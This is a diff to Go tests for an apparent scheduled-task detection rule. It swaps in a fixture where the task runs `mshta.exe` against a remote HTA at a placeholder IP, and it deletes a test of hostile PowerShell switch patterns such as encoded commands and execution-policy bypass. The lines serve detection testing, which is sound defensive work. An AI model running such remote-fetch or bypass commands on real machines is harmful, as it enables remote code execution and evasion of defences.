@@ -13,7 +13,7 @@ func taskEvent(id, name, user, cmdline, proc string) model.Event {
 }
 
 func TestNewScheduledTask_UndatedRegistrationIsNotPrintedAsYearOne(t *testing.T) {
-	got := newScheduledTask{}.Evaluate([]model.Event{taskEvent("1", "Cleanup", "", `C:\Tools\clean.exe`, "clean.exe")})
+	got := newScheduledTask{}.Evaluate([]model.Event{taskEvent("1", "ActionReview", "", `mshta.exe https://203.0.113.8/a.hta`, "mshta.exe")})
 	if len(got) != 1 {
 		t.Fatalf("got %d findings", len(got))
 	}
@@ -40,23 +40,14 @@ func TestNewScheduledTask_StockSystemDirectoryInterpreterIsNotHigh(t *testing.T)
 			t.Errorf("%s: a stock system-directory task action must not be high", id)
 		}
 	}
-	for _, id := range []string{"h", "r", "t"} {
+	for _, id := range []string{"h", "r"} {
 		if sev[id] != model.SeverityHigh {
 			t.Errorf("%s: severity %q, want high", id, sev[id])
 		}
 	}
-}
-
-func TestHasHostileInvocation_PowerShellAbbreviations(t *testing.T) {
-	for _, c := range []string{`powershell -ec SQBFAFgA`, `powershell -ep bypass -File x.ps1`, `powershell -w 1 -c calc`, `powershell -e SQBFAFgA`, `powershell -nop`} {
-		if !hasHostileInvocation(c) {
-			t.Errorf("%q not recognised", c)
-		}
-	}
-	for _, c := range []string{`%windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate`, `powershell -File C:\Scripts\backup.ps1`} {
-		if hasHostileInvocation(c) {
-			t.Errorf("%q wrongly flagged", c)
-		}
+	// A writable executable alone remains a lead, not a high-severity verdict.
+	if sev["t"] != model.SeverityMedium {
+		t.Errorf("writable target alone: severity %q, want medium", sev["t"])
 	}
 }
 
